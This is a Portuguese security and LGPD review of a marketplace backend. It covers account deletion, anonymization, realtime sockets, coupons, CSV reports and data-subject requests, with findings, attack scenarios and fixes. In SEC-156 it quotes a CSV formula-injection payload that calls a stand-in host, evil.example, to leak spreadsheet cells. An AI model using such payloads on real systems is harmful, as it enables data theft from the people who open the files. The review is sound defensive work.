# Revisão de segurança e LGPD: Onda 6 do back-end (privacidade, tempo real, marketing, relatórios, denúncias)

- **Data:** 2026-11-19 | **Revisor:** security-engineer | **Base:** `claude/admiring-lamport-62tq1a` em `98a2b14` (os 3 commits depois de `f8c8bc5` não tocam os módulos revisados).
- **Escopo:** `apps/api/src/modules/privacy/*` (exclusão no app e na web, arrependimento, anonimização, exportação, DSR, expurgo), `realtime/*` (tickets), `marketing/*` (push segmentado, cupons da plataforma), `reports/*`, `feedback/*` (denúncia, moderação, resposta da loja), `cart/cart.module.ts` (cupom), e os testes `privacy-*`, `realtime`, `marketing-*`, `reports`, `feedback`. **Fora:** telas do app e da página web (não existem para exclusão e exportação, ver SEC-166), infraestrutura, pentest.
- **Referências:** ADR-012, ADR-003/004, DEC-014, 015, 025, 043 a 048, `requisitos-seguranca.md` (SEC-008, 014, 060, 070 a 076, 096), `divida-tecnica.md` (DT-052, 054, 059 a 064), `docs/deploy/guia-deploy.md` §8.
- **Método:** leitura do código, os 9 arquivos E2E da onda (49 testes, todos passam) e um spec de ataque **fora do repositório** (scratchpad, 8 cenários, contra Postgres e Redis reais). Nada foi versionado além deste documento.

## Parecer para o G5 (privacidade e exclusão): REPROVADO

A API está bem desenhada: só a senha confirma, nenhuma sessão nasce da página web, o ticket é de uso único, o export é só do titular, com link de uso único e `no-store`, o DSR mascara o e-mail e o expurgo é idempotente. Mas hoje o G5 não passa, por três motivos:
1. **Nada disso chega ao usuário (SEC-166, Alta).** O app e o `apps/web` não chamam `/v1/me/deletion`, `/v1/auth/account-deletion/*` nem `/v1/me/data-exports`. A Apple (5.1.1(v)) e o Google Play (exclusão pela web) olham a funcionalidade no app e na página publicada, não na API.
2. **A anonimização deixa texto livre do titular para trás (SEC-158).** Motivo de cancelamento, eventos do pedido e da troca, texto da denúncia e resposta da loja. Foi provado por ataque: o teste de varredura atual passa porque a fixture não preenche esses campos.
3. **A página web de exclusão tem 2 falhas exigidas pelo SEC-096:** permite descobrir se uma conta confirmada existe (SEC-152) e ignora o step-up da conta (SEC-153). Além disso, o socket continua aberto depois da exclusão (SEC-157).

**Vira APROVADO COM RESSALVAS** quando: SEC-166 for entregue e testado pelo QA; SEC-152, 153, 157, 158 e 160 estiverem corrigidos; e o fundador decidir o SEC-154 (prazo de arrependimento) e o DT-063 (SEC-159, com o jurídico).

**Fora da privacidade, mas bloqueia o G4:** SEC-155 (Alta). O cupom "só na primeira compra" não confere nada: quem já comprou usa de novo. Até a correção, **não criar cupom da plataforma com `firstPurchaseOnly`**.

## Achados

| ID | Sev. | Tema | Dono | Bloqueia | Status |
|---|---|---|---|---|---|
| SEC-152 | Média | Exclusão pela web, via A: o 2º pedido em 60 s devolve 429 só para conta confirmada (enumeração) | backend-dev | G5 | Aberto |
| SEC-153 | Média | Exclusão pela web, via B: ignora o step-up da conta e não soma as falhas no contador por conta | backend-dev | G5 | Aberto |
| SEC-154 | Média | Exclusão imediata e irreversível por padrão (0 h): com a senha vazada, o concorrente fecha a loja do dono e apaga o contato na hora | fundador (decide), backend-dev | G5 (decisão) | Aberto |
| SEC-155 | **Alta** | Cupom "só na primeira compra" não é conferido (`hasPaidOrder` sempre `false`); faltam os controles anti-multiconta do SEC-060 | backend-dev | **G4** | Aberto |
| SEC-156 | Média | CSV dos relatórios do admin: motivo de cancelamento do cliente com quebra de linha injeta fórmula | backend-dev | G4 | Aberto |
| SEC-157 | Média | Socket do tempo real continua aberto depois da exclusão (e de qualquer revogação) | backend-dev | G5 | Aberto |
| SEC-158 | Média | Anonimização incompleta: texto livre do titular fica em pedidos, eventos, denúncias, DSR e resposta da loja | backend-dev | G5 | Aberto |
| SEC-159 | Baixa | DT-063: IP fica em `terms_acceptances`/`consents` e no `audit_log` depois da exclusão | security-engineer (parecer), jurídico, backend-dev | G5 (decisão) | Aberto |
| SEC-160 | Média | Falha ou adiamento da anonimização sem alerta: o prazo de 15 dias pode estourar sem ninguém saber | backend-dev | G5 | Aberto |
| SEC-161 | Baixa | Restaurar um backup traz de volta contas já anonimizadas | backend-dev, tech-lead | — | Aberto |
| SEC-162 | Baixa | Tokens OAuth do Mercado Pago do dono excluído ficam ativos para sempre (e a conta MP não reconecta em loja nova) | backend-dev | — | Aberto |
| SEC-163 | Baixa | DSR: sem conferência de identidade registrada, sem retenção do pedido e e-mail enviado a qualquer endereço | backend-dev, product-owner | — | Aberto |
| SEC-164 | Baixa | Exportação: arquivo órfão quando o banco falha depois do upload; arquivo sem denúncias nem campanhas recebidas | backend-dev | — | Aberto |
| SEC-165 | Baixa | Push segmentado: se a gravação depois do envio falhar, a campanha é reenviada a todos a cada 5 min | backend-dev | — | Aberto |
| SEC-166 | **Alta** | Exclusão e exportação não existem no app nem na página web (Apple 5.1.1(v), Google Play, LGPD art. 18) | mobile-dev | **G5** | Aberto |
| SEC-167 | Baixa | Menor privilégio: a exceção do `privacy` não é exclusiva nem vigiada; nada garante que tabela nova entre na anonimização | backend-dev, tech-lead | — | Aberto |

---

### SEC-152 | Severidade: Média | Status: Aberto
Onde: `apps/api/src/modules/privacy/web-deletion.service.ts:52-57` (`requestCode`), `POST /v1/auth/account-deletion/start` sem `password`
Problema: os limites de envio (`codes.enforceSendLimits`, intervalo `otp_reenvio_s`) só rodam **depois** de achar a conta confirmada. Por isso o 2º pedido em 60 s devolve 429 para conta confirmada e 200 para e-mail inexistente ou não confirmado. O SEC-096 exige resposta igual.
Cenário de ataque: provado pelo ataque A1: a conta real deu `[200, 429]` e o e-mail fantasma `[200, 200]`. Com 2 requisições por e-mail, dá para montar a lista de clientes e lojistas da Webag, que serve para phishing direcionado e credential stuffing. O limite por IP (5/h) é contornado trocando de IP.
Correção recomendada: fazer como o `forgotPassword` (`auth.service.ts:300-306`): chamar `enforceSendLimits(sha256Hex(email), 'delete_web', email, ctx)` **antes** do `find`, para todo e-mail. Só o `issue` fica condicionado à conta confirmada.
Como verificar a correção: E2E com 2 pedidos seguidos para conta confirmada e para e-mail inexistente: os dois devolvem a mesma sequência de status e o mesmo corpo.

### SEC-153 | Severidade: Média | Status: Aberto
Onde: `web-deletion.service.ts:72-89` (`withPassword`)
Problema: (a) a falha de senha não chama o `lfa:<userId>` do login (`auth.service.ts:255-267`), então não conta para o step-up por conta. (b) A conta já em step-up (>= `login_stepup_falhas_h` falhas/h) recebe o `deleteTicket` só com a senha, sem o código por e-mail que o login exigiria. O SEC-096 pede: "as falhas somam no SEC-004 (step-up por conta)" e "conta em step-up e não confirmada → mensagem genérica".
Cenário de ataque: provado pelo ataque A2. Com 20 falhas de login, o login passou a pedir código (`LOGIN_CODE_REQUIRED`). Depois, `start` com a senha certa deu 200 com `deleteTicket` e `finish` deu 200: conta excluída. 3 falhas pela via B deixaram o `lfa` em 20. Ou seja: a conta que está sob ataque, justamente quando o step-up protege o login, ainda pode ser destruída pela página de exclusão. Com o padrão de 0 h (SEC-154), a perda é imediata e sem volta.
Correção recomendada: na falha, chamar o mesmo `registerFailure` do login (ou somar `lfa:<id>`). Com a senha certa, se `peek(lfa) >= login_stepup_falhas_h`: (i) e-mail confirmado: exigir a via A (código), com a resposta 403 `LOGIN_CODE_REQUIRED` igual à do login; (ii) e-mail não confirmado: a mensagem genérica do SEC-096.
Como verificar a correção: o cenário A2 vira E2E. Depois de 20 falhas, a via B com a senha certa não emite ticket. Falhas na via B aumentam `lfa`.

### SEC-154 | Severidade: Média | Status: Aberto (decisão do fundador)
Onde: `apps/api/src/modules/admin/parameters.definitions.ts:86` (`exclusao_arrependimento_horas` = 0), `account-deletion.service.ts:162-189`
Problema: com 0 h, a exclusão anonimiza na mesma chamada. Para o dono de loja, isso também encerra a loja e apaga telefone, WhatsApp e endereço dela (`:342-344`). O aviso por e-mail chega depois do fato.
Cenário de ataque: um lojista concorrente (ou quem comprou uma lista vazada) tem a senha do dono e exclui a conta pela web (via B, sem 2º fator). A loja sai do ar na hora e os dados de contato somem. Recuperar exige recadastro manual pelo suporte. O fato de o padrão ser 0 h torna irreversível um incidente que, de outro jeito, seria reversível.
Correção recomendada: **72 h de arrependimento** (o ADR-012 já suporta; vai muito abaixo do teto de 15 dias da LGPD). Ao pedir, e-mail imediato "Pedimos para excluir sua conta. Não foi você? Entre e cancele." Alternativa mínima: 72 h só para quem tem o papel `merchant`. Login e sessões continuam bloqueados durante o prazo, então a Apple 5.1.1(v) segue atendida: a exclusão é iniciada no app e a conta fica inacessível na hora. **Decisão do fundador** (registrar em `decisoes.md`). O texto "O que acontece" da tela já usa `regretHours` da API.
Como verificar a correção: com o parâmetro em 72 h, excluir → `status: pending`, login → 401/403, e-mail de aviso no Mailpit, `cancel` com e-mail e senha → conta e loja de volta.

### SEC-155 | Severidade: Alta | Status: Aberto
Onde: `apps/api/src/modules/cart/cart.module.ts:12-15,21` (`NoPaidOrdersYet.hasPaidOrder` → sempre `false`, e nenhum módulo substitui o provider), `cart/domain/coupon.ts:56`
Problema: a regra "só na primeira compra" nunca dispara. Também não existe nenhum controle do SEC-060 contra multicontas: mesmo aparelho, telefone, endereço normalizado ou pagador. Com o O6.3, o admin já cria esses cupons pelo painel (`marketing-admin.controller.ts`).
Cenário de ataque: provado pelo ataque A3. Um cliente com pedido pago e entregue aplicou um cupom `firstPurchaseOnly` de R$ 10: 200, e o 2º pedido nasceu com `discount 1000`. Numa campanha de boas-vindas, **todo cliente que já comprou** ganha o desconto, e quem cria contas com e-mails descartáveis ganha uma vez por conta. É custo direto da Webag, limitado só pela taxa Webag de cada pedido (DEC-016).
Correção recomendada: (1) implementar o `PurchaseHistoryPort` no módulo `orders` (existe pedido com `paid_at` não nulo e não estornado do usuário) e registrar como provider; (2) SEC-060 mínimo para o MVP: recusar a primeira compra se o **telefone normalizado** ou o **endereço normalizado** (CEP + número) já tiver pedido pago de outra conta. O id do aparelho entra quando o app enviar `deviceId`, e o documento do pagador quando o MP devolver; (3) até a correção, `PlatformCouponsService.create/update` recusa `firstPurchaseOnly: true` (422), para que o painel não crie um cupom que não funciona.
Como verificar a correção: o cenário A3 → 4xx `COUPON_FIRST_PURCHASE_ONLY`; uma segunda conta com o mesmo telefone ou endereço → recusada; teste unitário do port.

### SEC-156 | Severidade: Média | Status: Aberto
Onde: `apps/api/src/modules/reports/reports.service.ts:255,257` (`orders.csv`) e `:280` (`operations.csv`); a origem é `orders/orders.controller.ts:49` (motivo livre do cliente, até 200 caracteres, com `\n`) e o motivo de recusa da loja
Problema: `cell()` só neutraliza `=+-@` **no início do valor** e não põe a célula entre aspas. Uma quebra de linha dentro do motivo cria uma linha nova cuja 1ª célula começa com `=`. O `operations.csv` nem passa pelo `cell()`. Os CSV de auditoria (`admin.controllers.ts:309-314`) já fazem certo.
Cenário de ataque: provado pelo ataque A4. O cliente cancela com `mudei de ideia\n=HYPERLINK("https://evil.example/?x="&A1;...)` e a linha `=HYPERLINK(...)` aparece no `orders.csv` e no `operations.csv`. O admin (operação ou financeiro) abre a planilha. No Google Sheets, `IMPORTXML`/`IMAGE` com um argumento vazam outras células para o atacante sem clique. No Excel, é link enganoso ou DDE em versão sem proteção. O lojista mal-intencionado faz o mesmo pelo motivo de recusa.
Correção recomendada: usar um único `csvCell` compartilhado (o de `admin.controllers.ts:309`, que já trata `\t` e `\r`), com aspas sempre que houver `;`, `"`, `\r` ou `\n`. Como o separador é `;`, a regra de aspas deve olhar `;`, e não `,`. Aplicar também ao `operations.csv` e ao CSV de trocas e logística, se tiverem texto livre. Opcional: na entrada, o motivo de cancelamento troca `\r\n` por espaço.
Como verificar a correção: E2E com o payload acima → nenhuma linha começa com `=` e o motivo fica numa célula entre aspas; o `operations.csv` também.

### SEC-157 | Severidade: Média | Status: Aberto
Onde: `apps/api/src/modules/identity/session.service.ts:228` (`revoked$.next`, sem assinante), `realtime/realtime.gateway.ts:145` (`disconnectSession`, sem chamador), `:102` (o socket aberto por ticket vive o TTL inteiro do access); continua o DT-054
Problema: a exclusão (e também reset de senha, troca de e-mail e bloqueio) revoga a sessão no banco, mas não derruba o socket. O SEC-014 e o SEC-071 pedem a queda em até 5 s.
Cenário de ataque: provado pelo ataque A5: 1,5 s depois de `POST /v1/me/deletion` → 200, o socket ainda estava conectado. O aparelho roubado ou a sessão do funcionário removido continua recebendo eventos de `user:` e `store:` por até 15 min. Os eventos são avisos mínimos, mas trazem número e status do pedido da loja.
Correção recomendada: no `RealtimeService` (ou no gateway), assinar `sessions.revoked$` e chamar `disconnectSession` para cada `sessionId`. Para várias instâncias, publicar no adapter Redis (`serverSideEmit`) ou usar `server.in(userRoom).disconnectSockets()`. Na remoção de funcionário, `socketsLeave(storeRoom)`.
Como verificar a correção: o ataque A5 vira E2E e espera `disconnect` em até 2 s. O mesmo para reset de senha.

### SEC-158 | Severidade: Média | Status: Aberto
Onde: `apps/api/src/modules/privacy/account-deletion.service.ts:299-351` (lista do que é apagado)
Problema: ficam, ligados ao `user_id` da casca e legíveis pelo admin e pela loja:
| Tabela.coluna | Origem | Ação recomendada |
|---|---|---|
| `orders.cancel_reason`, `order_events.reason` (eventos com `actor = customer`) | motivo livre do cliente (`orders.controller.ts:49`) | `null` nos pedidos do titular e nos eventos com `actor_user_id` do titular |
| `exchange_events.reason` (`actor = customer`) | motivo de cancelamento da troca (`exchanges.controllers.ts:34`) | idem |
| `content_reports.text` | texto da denúncia (`feedback.controllers.ts:99`) | `null` onde `reporter_id` é o titular |
| `reviews.store_reply` das avaliações do titular | a loja costuma citar o cliente pelo nome | `null` |
| `privacy_requests.answer`, `privacy_request_events.note` | resposta do encarregado, que pode citar dados | `[anonimizado]` como no `requester_email` (`:339`) |
| `audit_log.ip`/`user_agent` das ações do próprio titular | `account.deletion_requested` etc. | ver SEC-159 |
Cenário de ataque: provado pelo ataque A6. Depois da exclusão, a varredura achou o texto `Sou Marilda <tag> 11988887777` em `orders` e `order_events` e o texto da denúncia em `content_reports`. Nome e telefone sobrevivem à "anonimização", e o e-mail "apagamos seus dados pessoais" fica falso (LGPD art. 16 e 18 VI; art. 6 VI, transparência).
Correção recomendada: incluir as atualizações acima na transação. `order_events` e `exchange_events` não têm trigger append-only, então o UPDATE funciona. **Estender a fixture `richCustomer`** de `privacy-deletion.e2e-spec.ts` para preencher todo campo de texto livre com a `tag` (cancelar um pedido com motivo, cancelar troca, denunciar, receber resposta da loja, abrir DSR). A varredura atual então pega a regressão sozinha. Ver também SEC-167.
Como verificar a correção: o ataque A6 sem vazamentos (`leaks = []`), com exceção documentada apenas de `access_log` (Marco Civil, 6 meses).

### SEC-159 | Severidade: Baixa | Status: Aberto (parecer + jurídico) — fecha o DT-063
Onde: `users/db/schema.ts` (`terms_acceptances.ip`, `consents.ip`, append-only por `drizzle/0001_append_only_guards.sql:19-22`), `account-deletion.service.ts:311-312`, `audit_log.ip` (SEC-074, 5 anos)
Problema: depois da anonimização, IP e data do aceite continuam ligados à casca. IP com data e hora reidentifica a pessoa com o registro do provedor de internet, então isso é **dado pseudonimizado, não anonimizado** (LGPD art. 12 e 13 §4). O ataque A6 achou 2 `terms_acceptances` e 1 `audit_log` com IP.
**Parecer do Security (a validar com o jurídico, item J novo):**
- A prova do consentimento (art. 8 §2) é **versão do documento + data/hora + plataforma + o fato de a conta ter existido**. Depois que a pessoa sai, o IP não acrescenta prova: não há mais titular a quem opor o aceite sem os outros dados, que já foram apagados.
- **Recomendação:** na anonimização, zerar `ip` em `terms_acceptances` e `consents` do titular. O trigger append-only ganha **uma única exceção**: `UPDATE` que só muda `ip` para `NULL` (`NEW` igual a `OLD` exceto `ip`, e `NEW.ip IS NULL`). Qualquer outra mudança continua bloqueada.
- `audit_log`: não gravar IP e user agent quando o ator é o próprio cliente (`actorRole` `customer`/`titular`), porque o `access_log` já guarda isso por 6 meses (Marco Civil). Para admin, lojista e equipe, mantém (SEC-074, prova de ação de quem opera).
- Backups: a cópia cifrada de 30 dias (`guia-deploy.md` §8) é aceitável como "dado fora de uso" pelo prazo de rotação, desde que SEC-161 seja atendido e a política de privacidade cite o prazo.
Como verificar a correção: depois da exclusão, `terms_acceptances.ip` e `consents.ip` do titular são `NULL`; `UPDATE terms_acceptances SET document_id = ...` pela app → erro do trigger; `audit_log` da exclusão sem IP.

### SEC-160 | Severidade: Média | Status: Aberto
Onde: `account-deletion.service.ts:238-257` (`processDue`: só `failures + 1` e log), `:270-274` (bloqueio → adia +1 h, sem limite)
Problema: uma anonimização que falha sempre (erro de dado, storage fora) ou que fica bloqueada (estorno `pending` preso, troca que nunca fecha) é tentada para sempre, e ninguém fica sabendo. O teto de 15 dias da LGPD (`exclusao_anonimizacao_dias`) estoura em silêncio.
Cenário de ataque: falha operacional, não um ataque. O titular recebe "Sua conta será excluída" e, 30 dias depois, os dados ainda estão lá: é a reclamação clássica na ANPD.
Correção recomendada: alerta `account_deletion_failed` (em `payment_alerts`, como o `retention_failed`) quando `failures >= 3`, e `account_deletion_overdue` quando `requested_at + exclusao_anonimizacao_dias - 2 dias` passar com `status = pending`. Uma vez por exclusão. O passo do expurgo diário pode fazer a varredura.
Como verificar a correção: E2E com o storage falhando 3 vezes → 1 alerta; exclusão com bloqueio que não fecha e relógio em +14 dias → 1 alerta.

### SEC-161 | Severidade: Baixa | Status: Aberto
Onde: `docs/deploy/guia-deploy.md` §8.4 (restauração), backups de 14 dias no servidor e 30 dias fora
Problema: restaurar um backup de D-10 traz de volta, com nome, e-mail e endereço, as contas anonimizadas entre D-10 e hoje. O registro delas (`account_deletions`, `audit_log`) também volta ao estado antigo, então nada avisa.
Correção recomendada: o job de anonimização grava, fora do banco (o mesmo bucket do backup, num objeto diário só com `user_id` e data, sem dado pessoal), a lista de quem foi anonimizado. O runbook §8.4 ganha o passo `node dist/cli.js privacy:reapply-deletions --since <data do backup>`, que reaplica `anonymizeOne` a essas contas antes de reabrir o tráfego.
Como verificar a correção: no teste de restauração mensal (§8.3), excluir uma conta depois do backup, restaurar, rodar o comando → a conta volta anonimizada.

### SEC-162 | Severidade: Baixa | Status: Aberto
Onde: `account-deletion.service.ts:342-344` (a loja é encerrada, mas `payment_accounts` fica intacta), `stores/db/schema.ts:268-295`
Problema: o `tokensEnc` do Mercado Pago do dono excluído fica guardado e `status` continua ativo, sem prazo. O índice único `payment_accounts_provider_uq` também impede o mesmo titular de conectar aquela conta MP numa loja nova.
Correção recomendada: os tokens são necessários para estornos tardios (SEC-130). Por isso, guardar enquanto houver janela de estorno (prazo máximo de troca + 30 dias [HIPÓTESE], parâmetro) e depois marcar `disconnected` e apagar `tokensEnc`, pelo expurgo diário. Se o MP oferecer revogação do token, chamar.
Como verificar a correção: dono excluído + relógio além da janela → `status = disconnected`, `tokens_enc` vazio, e a mesma conta MP conecta em outra loja.

### SEC-163 | Severidade: Baixa | Status: Aberto
Onde: `privacy/dsr.service.ts:104-126` (público), `:166-182` (`answer` por e-mail)
Problema: (a) qualquer pessoa abre "acesso" ou "exclusão" com o e-mail de outra pessoa e não existe passo de conferência de identidade antes de atender; (b) a resposta livre vai por e-mail e pode carregar dado pessoal; (c) DSR sem conta guarda o e-mail para sempre (o expurgo não cobre); (d) "Recebemos seu pedido" sai para qualquer endereço (5/h por IP, 3/dia por e-mail), o que, trocando de IP, vira um refletor de e-mail com a marca Webag.
Correção recomendada: (a)+(b) no runbook do encarregado: acesso e exclusão são atendidos **só** pelo autosserviço (export e exclusão no app/web) ou depois de a pessoa provar o controle da conta (login ou código no e-mail confirmado); a resposta por e-mail nunca leva dados, só orienta. (c) retenção de 5 anos [validar com o jurídico], depois `requester_email`, `message` e `answer` são anonimizados no expurgo. (d) limite global por hora no envio do "recebemos" e texto sem nada clicável.
Como verificar a correção: runbook revisado pelo Security; passo novo no expurgo com E2E.

### SEC-164 | Severidade: Baixa | Status: Aberto
Onde: `privacy/data-export.service.ts:186-202` (`build`), `:209-284` (`collect`)
Problema: (a) se o `putObject` funcionar e o `update` do banco falhar, o objeto `exports/<user>/<id>.json` fica sem `objectKey` registrado. Depois de 3 falhas, nem o vencimento nem a anonimização (que apagam por `objectKey`) o encontram. (b) O arquivo não inclui as denúncias feitas pelo titular nem as campanhas de push recebidas e abertas. O art. 19 II pede declaração completa.
Correção recomendada: (a) no `catch`, apagar a chave determinística `exports/<userId>/<exportId>.json`. Na anonimização, apagar a chave de **toda** linha de `data_exports` do titular, calculada pelo id e não pelo `objectKey` gravado. A interface `ObjectStorage` não lista por prefixo; o S3 lista, então acrescentar `deleteByPrefix` só se for barato. (b) incluir `contentReports` (tipo, motivo, texto, status) e `pushCampaigns` (título, data, aberto).
Como verificar a correção: E2E com o banco falhando depois do upload → nenhum objeto em `exports/<user>/`; o JSON tem as chaves novas.

### SEC-165 | Severidade: Baixa | Status: Aberto
Onde: `marketing/push-campaigns.service.ts:279-286` (falha → volta para `scheduled` em +5 min, sem teto) e `:304-321` (destinatários gravados só **depois** do envio)
Problema: se a transação depois do `push.send` falhar (banco, auditoria), a campanha volta à fila e é **reenviada a todos** a cada 5 min. O limite semanal (`push_mkt_max_semana`) não segura, porque ninguém foi gravado. Se o processo cair entre o envio e a gravação, a campanha fica presa em `sending` (aí sem reenvio).
Correção recomendada: gravar os destinatários (`onConflictDoNothing`) **antes** de enviar, em lotes, e marcar `sent_at` só nos aceitos. Teto de 3 tentativas por campanha e depois `failed`, com alerta. Varredura de `sending` com mais de 30 min → `failed` com alerta (sem reenviar).
Como verificar a correção: teste com a auditoria lançando erro no 1º ciclo → no 2º ciclo, ninguém recebe de novo.

### SEC-166 | Severidade: Alta | Status: Aberto (bloqueia G5)
Onde: `apps/mobile` e `apps/web`: nenhuma referência a `/v1/me/deletion`, `/v1/auth/account-deletion/*` ou `/v1/me/data-exports` (grep de 2026-11-19)
Problema: a exigência das lojas é a funcionalidade no produto publicado. Apple 5.1.1(v): excluir a conta **dentro do app**, sem pedir que a pessoa ligue ou mande e-mail. Google Play: **link web** de exclusão informado no Play Console e no formulário de Data Safety. Hoje só a API existe.
Cenário de ataque: não é ataque. É rejeição na revisão da App Store e do Play, e descumprimento da LGPD art. 18 VI e V (exclusão e portabilidade sem caminho para o titular).
Correção recomendada: app: "Conta > Privacidade e dados" com "Exportar meus dados" (WB-212) e "Excluir minha conta" (WB-213: overview com bloqueios, senha, resultado e prazo de arrependimento); web: `/excluir-conta` com vias A e B, revisão e confirmação (WB-214). A página faz o POST com `Origin` da allowlist e `X-Webag-Client` (SEC-013) e com `Referrer-Policy: no-referrer` (ticket no corpo, nunca na URL). Também: link da exclusão e da política no Data Safety e no App Privacy.
Como verificar a correção: QA executa WB-212/213/214 de ponta a ponta no app (Android e iOS) e na web; o checklist das lojas (`docs/deploy/checklist-publicacao-lojas.md`) marca a URL de exclusão.

### SEC-167 | Severidade: Baixa | Status: Aberto
Onde: `privacy`, `feedback` e `marketing` importam o schema agregado `platform/database/schema.js` (fora das próprias tabelas); `apps/api/eslint.config.mjs` sem regra de fronteira; um único papel de banco com DML em tudo
Problema: o ADR-012 justifica o `privacy` como **a** exceção que lê e altera tudo, mas (a) a exceção não é exclusiva nem vigiada por lint; (b) nada obriga que uma tabela nova com `user_id` ou texto livre entre na anonimização e na exportação. Foi exatamente o que gerou o SEC-158.
Correção recomendada (proporcional ao MVP):
1. **Teste de classificação** (o controle que mais importa): um E2E lê `information_schema` e falha se uma coluna com FK para `users.id`, ou uma coluna `text`/`varchar`/`jsonb` em tabela com essa FK, não estiver numa lista `PRIVACY_MAP` com a decisão de cada uma (`delete` | `anonymize` | `retain:<base legal>`). Tabela nova quebra o build até alguém decidir.
2. Lint `no-restricted-imports` do schema agregado, com allowlist explícita (`privacy`, `reports` e as exceções que o tech-lead aprovar no ADR-007).
3. Papel de banco separado para o `privacy` (só ele com `UPDATE` em colunas de outros módulos): **não agora**; reavaliar na Onda 7 com o tech-lead. Custo alto e ganho baixo enquanto API e jobs rodam no mesmo processo.
Como verificar a correção: criar uma tabela de teste com `user_id` → o teste de classificação falha.

---

## O que foi testado e resistiu

| Ataque | Resultado |
|---|---|
| Baixar a exportação de A com o token de B; reusar o link; usuário sem e-mail confirmado pede exportação | 404; 2º download 410; `Cache-Control: no-store`; 403 `EMAIL_VERIFICATION_REQUIRED` (A7) |
| Ticket de tempo real: repetir o mesmo ticket; pedir ticket de loja de que não sou membro | 2º handshake recusado (`GETDEL`); 404 (A8). O ticket é atrelado à sessão e as permissões são conferidas de novo no handshake |
| Admin exclui a própria conta pelo app ou pela web; corpo com `userId` de outro | 403 `ADMIN_ACCOUNT_NOT_DELETABLE`; resposta genérica na web; o corpo é `strictObject` (E2E existentes) |
| Depois da exclusão: access, refresh e login | 401 (o `principal.service.ts:31` confere `status` a cada requisição) |
| Força bruta da senha na exclusão do app e no arrependimento | 429 depois de `login_falhas` (conta+IP+escopo) e 5/h (e-mail+IP); `verifyDummy` iguala o tempo com e-mail inexistente |
| Exclusão concorrente e anonimização repetida | `FOR UPDATE` + `status = pending`, idempotente; arquivos apagados antes da transação |
| Expurgo diário em 2 instâncias | Inserção condicional em `retention_runs` (1 por 23 h), lotes de 5.000, só contagens, passos isolados com alerta |
| DSR: e-mail na fila, revelar | Mascarado; revelar exige reautenticação e grava motivo e auditoria; só `super_admin` (`privacy:manage`) |
| Push: público sem consentimento, segmento pequeno, fora da janela, flag desligada | Último evento de `marketing_push` precisa ser concessão; abaixo de `push_mkt_min_segmento` → 422 e a contagem não sai; fora da janela → próximo início; flag desligada cancela no envio; público recalculado no envio; `opened` só marca a própria linha |
| Relatórios e cupons por perfil | Suporte 403 nos relatórios; financeiro só lê cupons; nome de loja com `=` neutralizado (só no início, ver SEC-156) |
| Denúncia | Resposta sempre 202; dono e equipe não denunciam a própria loja ou produto; único por (alvo, denunciante); 20/h; avaliação só sai por ofensa, dado pessoal, ilegal ou spam |

Observação aceita (sem ID): a estimativa do push permite subtrair segmentos (cidade menos bairro) para inferir **contagens** pequenas, nunca identidades, e só por super admin ou operação. Risco residual baixo.

## Mapeamento de conformidade

| Exigência | Onde a API atende | Lacuna |
|---|---|---|
| **Apple 5.1.1(v)**: excluir dentro do app, sem ligar ou mandar e-mail; confirmação permitida | `POST /v1/me/deletion` (só senha), efeito imediato; bloqueios mostrados com o motivo | **SEC-166** (sem tela); conta sem senha (login social futuro) → `PASSWORD_NOT_SET` (DT-064) precisa de outro fator antes de existir login social |
| **Google Play**: link web de exclusão sem reinstalar o app; Data Safety coerente | `/v1/auth/account-deletion/*` (vias A e B, ticket, nenhuma sessão) | **SEC-166** (página), SEC-152, SEC-153; URL no Play Console |
| **LGPD art. 18 II e V** (acesso e portabilidade) | Export JSON estruturado, 1/dia, link de uso único (5 min), 7 dias | SEC-164 (completude), SEC-166 |
| **LGPD art. 18 VI e art. 16** (eliminação e o que pode ficar) | Casca + pedidos, ledger e fiscal (art. 16 I); endereço reduzido a cidade/UF; `access_log` 6 meses (Marco Civil art. 15) | SEC-158 (texto livre), SEC-159 (IP), SEC-160 (prazo), SEC-161 (backup) |
| **LGPD art. 18 VIII e IX** (consentimento e revogação) | `consents` por evento; o push respeita o último evento | — |
| **LGPD art. 18 §3-5 e art. 19** (canal e prazo) | DSR com protocolo, 15 dias, alerta aos 10 | SEC-163 (identidade, retenção); prazo e texto a validar com o jurídico |
| **LGPD art. 6 VII e art. 46** (segurança) | Sem sessão na web; link de uso único; DSR mascarado | SEC-157 (socket), SEC-167 (garantia estrutural) |
| Conta **bloqueada** pelo admin | Não exclui pelo app nem pela web (exige `active`) | Caminho é o DSR: registrar no runbook do encarregado (SEC-163) |

## Limites desta revisão

- Análise estática e E2E contra Postgres e Redis locais, sem pentest de rede, sem as telas (não existem) e sem o S3 real (o storage é em memória nos testes).
- O texto jurídico (prazo de arrependimento, retenção do DSR, IP como prova) é recomendação técnica: **validar com o advogado do fundador** antes do G5.
- O spec de ataque ficou no scratchpad da sessão e **não foi versionado** (lição do incidente de DEC-043). Os cenários A1 a A6 devem virar E2E do backend-dev junto com cada correção.
